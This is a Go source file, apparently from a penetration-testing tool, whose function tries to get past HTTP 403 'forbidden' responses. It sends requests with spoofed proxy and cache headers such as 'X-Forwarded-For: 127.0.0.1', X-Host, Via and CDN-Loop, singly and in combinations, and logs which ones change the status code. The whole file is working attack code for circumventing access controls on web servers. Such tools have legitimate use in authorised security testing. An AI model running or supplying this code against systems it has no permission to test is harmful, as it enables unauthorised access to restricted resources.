package bypass

import (
	"net/http"
	"strconv"
	"time"
)

// TestCachingProxyBypass tests caching and proxy-related headers to bypass 403 responses
func TestCachingProxyBypass(baseURL string, client *http.Client, config Config) ([]Result, error) {
	var results []Result

	// Get domain from base URL
	domain := parseDomain(baseURL)

	proxyHeaders := []struct {
		Header string
		Value  string
	}{
		{"X-Host", domain},
		{"X-Forwarded-Server", domain},
		{"X-Forwarded-Server", domain + ":80"},
		{"X-Forwarded-Server", domain + ":443"},
		{"Cache-Control", "no-transform"},
		{"Cache-Control", "no-store, no-cache, must-revalidate"},
		{"Cache-Control", "max-age=0"},
		{"Pragma", "no-cache"},
		{"X-Cache-Key", baseURL},
		{"If-Modified-Since", time.Now().Format(time.RFC1123)},
		{"If-Modified-Since", time.Now().Add(-24 * time.Hour).Format(time.RFC1123)},
		{"If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"},
		{"If-None-Match", "\"12345\""},
		{"If-None-Match", "W/\"12345\""},
		{"If-Range", "\"12345\""},
		{"Range", "bytes=0-100"},
		{"Accept-Encoding", "gzip, deflate"},
		{"Accept-Encoding", "identity"},
		{"Via", "1.1 " + domain},
		{"X-Forwarded-For", "127.0.0.1, " + domain},
		{"CDN-Loop", domain},
		{"X-Cache", "HIT"},
		{"X-Cache", "MISS"},
		{"X-Forwarded-CDN-Key", domain},
		{"Connection", "close"},
		{"Connection", "keep-alive"},
		{"X-URL-Scheme", "http"},
		{"X-URL-Scheme", "https"},
		{"X-Real-Proto", "http"},
		{"X-Real-Proto", "https"},
	}

	// Combinations of cache control headers
	cacheHeaders := []map[string]string{
		{
			"Cache-Control": "no-cache",
			"Pragma":        "no-cache",
		},
		{
			"Cache-Control":     "max-age=0",
			"If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT",
		},
		{
			"If-None-Match":     "*",
			"If-Modified-Since": time.Now().Add(-24 * time.Hour).Format(time.RFC1123),
		},
	}

	// Test individual headers
	for _, header := range proxyHeaders {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", config.UserAgent)
		req.Header.Set(header.Header, header.Value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, Result{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Proxy Cache: " + header.Header,
		})
	}

	// Test combined headers
	for i, headerSet := range cacheHeaders {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", config.UserAgent)
		for header, value := range headerSet {
			req.Header.Set(header, value)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, Result{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Combined Proxy Headers Set " + strconv.Itoa(i+1),
		})
	}

	return results, nil
}

// parseDomain extracts the domain from a URL
func parseDomain(rawURL string) string {
	parsedURL, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return ""
	}
	return parsedURL.Host
}
